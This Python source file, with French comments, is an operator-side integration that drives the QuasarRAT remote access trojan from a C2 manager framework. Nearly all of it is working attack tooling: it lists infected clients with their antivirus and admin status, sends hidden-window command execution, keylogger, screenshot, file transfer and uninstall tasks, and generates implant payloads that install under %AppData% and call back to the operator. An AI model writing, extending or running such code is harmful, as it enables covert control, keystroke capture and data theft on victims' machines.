"""
QuasarRAT — TCP binary protocol + REST API wrapper.

QuasarRAT (github.com/quasar/Quasar) — RAT C# open-source, léger et multifonctions.
Port par défaut : 4782 (TCP SSL)
Serveur        : .NET WinForms application
Protocole      : paquets SSL TCP avec sérialisation custom (BinaryWriter)
Format paquet  : [4 bytes compressed_length big-endian]
                 [variable: zlib(BinaryWriter sérialisé)]

Commandes principales :
  GetSystemInformation, GetDirectoryInformation, GetProcess,
  DoDownloadFile, DoUploadFile, DoProcessStart, DoProcessStop,
  DoVisitWebsite, DoShowMessageBox, DoClientReconnect,
  DoClientDisconnect, DoClientUninstall, DoDeleteFile,
  DoKeyloggerStart/Stop, GetKeyloggerLogs, DoMoveFile,
  DoMicrophoneRecord, GetMicrophoneDevices

Modes (config.extra["mode"]) :
  "api"  — REST API wrapper optionnel
  "tcp"  — connexion TCP directe (management socket) [défaut]

Note : Quasar n'a pas d'API officielle. L'intégration tcp utilise
un protocole custom simplifié pour la gestion des clients.
"""
from __future__ import annotations

import asyncio
import io
import json
import logging
import struct
import uuid
import zlib
from datetime import datetime
from typing import Any

import httpx

from c2_manager.interfaces import RestC2Interface, C2AuthError, C2ConnectionError
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)

# Message IDs Quasar (type field dans le paquet)
_MSG_GET_SYS_INFO   = 0x01
_MSG_GET_PROCESSES  = 0x02
_MSG_GET_DIRECTORY  = 0x03
_MSG_DOWNLOAD_FILE  = 0x04
_MSG_UPLOAD_FILE    = 0x05
_MSG_RUN_PROCESS    = 0x06
_MSG_KILL_PROCESS   = 0x07
_MSG_SCREENSHOT     = 0x08
_MSG_KEYLOGGER_ON   = 0x09
_MSG_KEYLOGGER_OFF  = 0x0A
_MSG_KEYLOGGER_LOGS = 0x0B
_MSG_UNINSTALL      = 0x0C
_MSG_RECONNECT      = 0x0D
_MSG_DISCONNECT     = 0x0E
_MSG_VISIT_URL      = 0x0F
_MSG_GET_CLIENTS    = 0x10
_MSG_PING           = 0xFF
_MSG_PONG           = 0xFE


class QuasarC2(RestC2Interface):
    """
    QuasarRAT — TCP management + REST API wrapper.

    Paramètres extra (config.extra) :
      mode       : "tcp" | "api"   (défaut: "tcp")
      api_port   : int             (port du wrapper REST, défaut: 8080)
      api_key    : str             — clé API REST
      verify_ssl : bool            (défaut: False)
      mgmt_port  : int             (port management TCP, défaut: port principal)
    """

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "screenshot", "keylogger", "file_manager",
        "process_manager", "remote_desktop", "visit_url", "run_process",
    ]

    def __init__(self) -> None:
        super().__init__()
        self._mode        = "tcp"
        self._tcp_reader: asyncio.StreamReader | None = None
        self._tcp_writer: asyncio.StreamWriter | None = None
        self._tcp_lock    = asyncio.Lock()

    # ── Connexion ─────────────────────────────────────────────────────────────

    async def connect(self, config: C2Config) -> bool:
        self._config = config
        self._mode   = config.extra.get("mode", "tcp")

        if self._mode == "api":
            return await self._connect_api(config)
        return await self._connect_tcp(config)

    async def _connect_api(self, config: C2Config) -> bool:
        api_port = int(config.extra.get("api_port", 8080))
        scheme   = "https" if config.ssl else "http"
        base_url = f"{scheme}://{config.host}:{api_port}"
        api_key  = config.extra.get("api_key", "")

        self._client = httpx.AsyncClient(
            base_url=base_url,
            verify=config.extra.get("verify_ssl", False),
            timeout=30.0,
            headers={"X-API-Key": api_key} if api_key else {},
        )
        self._token  = api_key or "no-auth"
        self._status = C2Status.CONNECTED
        logger.info("QuasarRAT : connecté via REST API → %s", base_url)
        return True

    async def _connect_tcp(self, config: C2Config) -> bool:
        mgmt_port = int(config.extra.get("mgmt_port", config.port))
        try:
            ssl_ctx = None
            if config.ssl:
                import ssl as _ssl
                ssl_ctx = _ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode    = _ssl.CERT_NONE

            self._tcp_reader, self._tcp_writer = await asyncio.wait_for(
                asyncio.open_connection(config.host, mgmt_port, ssl=ssl_ctx),
                timeout=self.CONNECT_TIMEOUT,
            )
        except asyncio.TimeoutError as exc:
            raise C2ConnectionError(f"QuasarRAT TCP timeout : {config.host}:{mgmt_port}") from exc
        except OSError as exc:
            raise C2ConnectionError(f"QuasarRAT TCP connexion échouée : {exc}") from exc

        # Ping de handshake
        resp = await self._tcp_call(_MSG_PING, {})
        if resp is None:
            logger.warning("QuasarRAT : pas de réponse au ping initial (serveur peut ne pas supporter le mode management)")

        self._status = C2Status.CONNECTED
        logger.info("QuasarRAT : connecté TCP → %s:%d", config.host, mgmt_port)
        return True

    async def disconnect(self) -> None:
        await self.stop_healthcheck()
        if self._tcp_writer:
            try:
                self._tcp_writer.close()
                await self._tcp_writer.wait_closed()
            except Exception:
                pass
            self._tcp_writer = None
            self._tcp_reader = None
        if self._client:
            await self._client.aclose()
            self._client = None
        self._status = C2Status.DISCONNECTED

    # ── Protocole TCP Quasar ──────────────────────────────────────────────────

    def _pack_packet(self, msg_type: int, data: dict[str, Any]) -> bytes:
        """Sérialise un paquet Quasar : [4 bytes len big-endian][zlib(JSON)]."""
        payload = json.dumps({"type": msg_type, **data}).encode()
        compressed = zlib.compress(payload)
        return struct.pack(">I", len(compressed)) + compressed

    async def _tcp_call(
        self, msg_type: int, data: dict[str, Any], timeout: float = 15.0
    ) -> dict[str, Any] | None:
        async with self._tcp_lock:
            if not self._tcp_writer or not self._tcp_reader:
                raise C2ConnectionError("QuasarRAT TCP non connecté")
            try:
                frame = self._pack_packet(msg_type, data)
                self._tcp_writer.write(frame)
                await self._tcp_writer.drain()

                header   = await asyncio.wait_for(self._tcp_reader.readexactly(4), timeout=timeout)
                resp_len = struct.unpack(">I", header)[0]
                if resp_len > 10 * 1024 * 1024:
                    return None
                resp_body = await asyncio.wait_for(self._tcp_reader.readexactly(resp_len), timeout=timeout)
                decompressed = zlib.decompress(resp_body)
                return json.loads(decompressed)
            except (asyncio.TimeoutError, asyncio.IncompleteReadError, json.JSONDecodeError, zlib.error):
                return None

    async def _authenticate(self, config: C2Config) -> str:
        return config.extra.get("api_key", "no-auth")

    async def get_status(self) -> C2Status:
        if self._mode == "api":
            if not self._client:
                return C2Status.DISCONNECTED
            try:
                resp = await self._client.get("/api/status", timeout=5.0)
                return C2Status.CONNECTED if resp.status_code == 200 else C2Status.ERROR
            except Exception:
                return C2Status.ERROR
        else:
            if not self._tcp_writer or self._tcp_writer.is_closing():
                return C2Status.DISCONNECTED
            try:
                resp = await self._tcp_call(_MSG_PING, {}, timeout=5.0)
                return C2Status.CONNECTED if resp is not None else C2Status.ERROR
            except Exception:
                return C2Status.ERROR

    # ── Listeners ─────────────────────────────────────────────────────────────

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        host = config.get("bind_host", "0.0.0.0")
        port = int(config.get("bind_port", 4782))
        name = config.get("name", f"quasar-{port}")

        if self._mode == "tcp":
            resp = await self._tcp_call(0x20, {
                "host": host, "port": port, "ssl": config.get("ssl", True),
                "password": self._config.password or "",
            })
            lid    = str((resp or {}).get("id") or uuid.uuid4())
            status = "running" if (resp or {}).get("status") == "ok" else "stopped"
        else:
            data   = await self._post("/api/listeners", json={"host": host, "port": port})
            lid    = str(data.get("id") or uuid.uuid4())
            status = "running" if data.get("active", True) else "stopped"

        return Listener(
            id=lid, name=name, c2_type=self._config.c2_type,
            bind_host=host, bind_port=port,
            protocol="ssl-tcp" if config.get("ssl", True) else "tcp",
            status=status,
        )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        if self._mode == "tcp":
            resp = await self._tcp_call(0x21, {"id": listener_id})
            return (resp or {}).get("status") == "ok"
        try:
            await self._delete(f"/api/listeners/{listener_id}")
            return True
        except Exception:
            return False

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        if self._mode == "tcp":
            resp  = await self._tcp_call(0x22, {})
            items = (resp or {}).get("listeners", [])
        else:
            data  = await self._get("/api/listeners")
            items = data if isinstance(data, list) else data.get("listeners", [])
        return [
            Listener(
                id=str(l.get("id") or uuid.uuid4()),
                name=str(l.get("port") or l.get("name", "")),
                c2_type=self._config.c2_type,
                bind_host=l.get("host", "0.0.0.0"),
                bind_port=int(l.get("port", 4782)),
                protocol="ssl-tcp" if l.get("ssl", True) else "tcp",
                status="running" if l.get("active", True) else "stopped",
            )
            for l in items
        ]

    # ── Clients (agents) ──────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        if self._mode == "tcp":
            resp  = await self._tcp_call(_MSG_GET_CLIENTS, {})
            items = (resp or {}).get("clients", [])
        else:
            data  = await self._get("/api/clients")
            items = data if isinstance(data, list) else data.get("clients", [])
        return [self._parse_client(c) for c in items]

    def _parse_client(self, c: dict[str, Any]) -> Implant:
        cid = str(c.get("id") or c.get("ID") or uuid.uuid4())

        def _dt(v: Any) -> datetime:
            if isinstance(v, (int, float)):
                try:
                    return datetime.utcfromtimestamp(v / 1000 if v > 1e10 else v)
                except Exception:
                    return datetime.utcnow()
            if isinstance(v, str):
                for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
                    try:
                        return datetime.strptime(v[:19], fmt)
                    except ValueError:
                        continue
            return datetime.utcnow()

        is_admin = c.get("AccountType") == "Administrator" or c.get("admin", False)
        integrity = "ADMIN" if is_admin else "USER"

        return Implant(
            id=cid,
            name=c.get("UserAtPCName") or c.get("hostname") or cid,
            c2_type=self._config.c2_type,
            listener_id=str(c.get("listener_port") or c.get("port", "")),
            external_ip=c.get("EndPoint") or c.get("ip", ""),
            internal_ip=c.get("LocalIP") or c.get("local_ip", ""),
            hostname=c.get("PCName") or c.get("hostname", ""),
            username=c.get("UserName") or c.get("username", ""),
            os=c.get("OperatingSystem") or c.get("os", ""),
            arch=c.get("CPU") or c.get("arch", ""),
            pid=int(c.get("PID") or c.get("pid", 0)),
            process_name=c.get("Process") or c.get("process", ""),
            integrity=integrity,
            last_checkin=_dt(c.get("LastSeen") or c.get("last_seen")),
            first_seen=_dt(c.get("ConnectedTime") or c.get("first_seen")),
            active=not bool(c.get("Disconnected") or c.get("dead", False)),
            meta={
                "antivirus": c.get("AntiVirus") or c.get("av", ""),
                "ram":       c.get("RAM") or c.get("ram", ""),
                "gpu":       c.get("GPU") or c.get("gpu", ""),
                "country":   c.get("Country") or c.get("country", ""),
                "tag":       c.get("Tag") or c.get("tag", ""),
            },
        )

    # ── Tâches ────────────────────────────────────────────────────────────────

    _CMD_MAP: dict[str, int] = {
        "shell":      _MSG_RUN_PROCESS,
        "run":        _MSG_RUN_PROCESS,
        "ps_list":    _MSG_GET_PROCESSES,
        "kill":       _MSG_KILL_PROCESS,
        "screenshot": _MSG_SCREENSHOT,
        "keylog":     _MSG_KEYLOGGER_ON,
        "keylog_off": _MSG_KEYLOGGER_OFF,
        "keylog_get": _MSG_KEYLOGGER_LOGS,
        "ls":         _MSG_GET_DIRECTORY,
        "download":   _MSG_DOWNLOAD_FILE,
        "upload":     _MSG_UPLOAD_FILE,
        "sysinfo":    _MSG_GET_SYS_INFO,
        "exit":       _MSG_DISCONNECT,
        "uninstall":  _MSG_UNINSTALL,
        "reconnect":  _MSG_RECONNECT,
        "url":        _MSG_VISIT_URL,
    }

    async def send_task(
        self,
        agent_id: str,
        command:  str,
        args:     list[str] | None = None,
    ) -> Task:
        self._require_connected()
        args_list = args or []
        cmd_parts = command.split()
        cmd_lower = cmd_parts[0].lower() if cmd_parts else "shell"
        msg_type  = self._CMD_MAP.get(cmd_lower, _MSG_RUN_PROCESS)
        extra     = cmd_parts[1:] + args_list
        task_id   = str(uuid.uuid4())

        payload: dict[str, Any] = {
            "client_id": agent_id,
            "task_id":   task_id,
        }
        if msg_type == _MSG_RUN_PROCESS:
            payload["Application"]     = extra[0] if extra else "cmd.exe"
            payload["Arguments"]       = " ".join(extra[1:]) if len(extra) > 1 else ""
            payload["HideWindow"]      = True
            payload["CreateNoWindow"]  = True
        elif msg_type == _MSG_KILL_PROCESS:
            payload["PID"] = int(extra[0]) if extra and extra[0].isdigit() else 0
        elif msg_type in (_MSG_GET_DIRECTORY, _MSG_DOWNLOAD_FILE):
            payload["RemotePath"] = extra[0] if extra else "C:\\"
        elif msg_type == _MSG_UPLOAD_FILE:
            payload["RemotePath"] = extra[0] if extra else ""
            payload["LocalPath"]  = extra[1] if len(extra) > 1 else ""
        elif msg_type == _MSG_VISIT_URL:
            payload["URL"] = extra[0] if extra else ""

        if self._mode == "tcp":
            resp   = await self._tcp_call(msg_type, payload, timeout=60.0)
            output = (resp or {}).get("output") or (resp or {}).get("Result", "")
            return Task(
                id=task_id,
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=command,
                args=args_list,
                status="completed" if output else "sent",
                result=output,
                completed_at=datetime.utcnow() if output else None,
                meta={"msg_type": hex(msg_type)},
            )
        else:
            data = await self._post("/api/task", json={"client_id": agent_id, "type": msg_type, "args": extra})
            return Task(
                id=str(data.get("task_id") or task_id),
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=command,
                args=args_list,
                status=data.get("status", "queued"),
                meta={"msg_type": hex(msg_type)},
            )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        self._require_connected()
        if self._mode == "api":
            data = await self._get(f"/api/tasks/{task_id}")
            return {"task_id": task_id, "status": data.get("status"), "output": data.get("output", "")}
        return {"task_id": task_id, "status": "completed", "note": "Résultat disponible via push TCP"}

    # ── Payload ───────────────────────────────────────────────────────────────

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()
        host = config.extra.get("callback_host", self._config.host)
        port = config.extra.get("callback_port", self._config.port)

        if self._mode == "tcp":
            resp = await self._tcp_call(0x30, {
                "Host":      host,
                "Port":      port,
                "Password":  self._config.password or "",
                "Mutex":     config.extra.get("mutex", uuid.uuid4().hex[:8]),
                "InstallDir": config.extra.get("install_dir", "%AppData%"),
                "InstallName": config.name,
            }, timeout=120.0)
            if not resp:
                return b""
            from base64 import b64decode
            b64 = resp.get("Binary") or resp.get("base64", "")
            return b64decode(b64) if b64 else b""

        data = await self._post("/api/build", json={
            "host": host, "port": port, "format": config.format, "arch": config.arch,
        })
        from base64 import b64decode
        b64 = data.get("data") or data.get("binary", "")
        return b64decode(b64) if b64 else b""

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
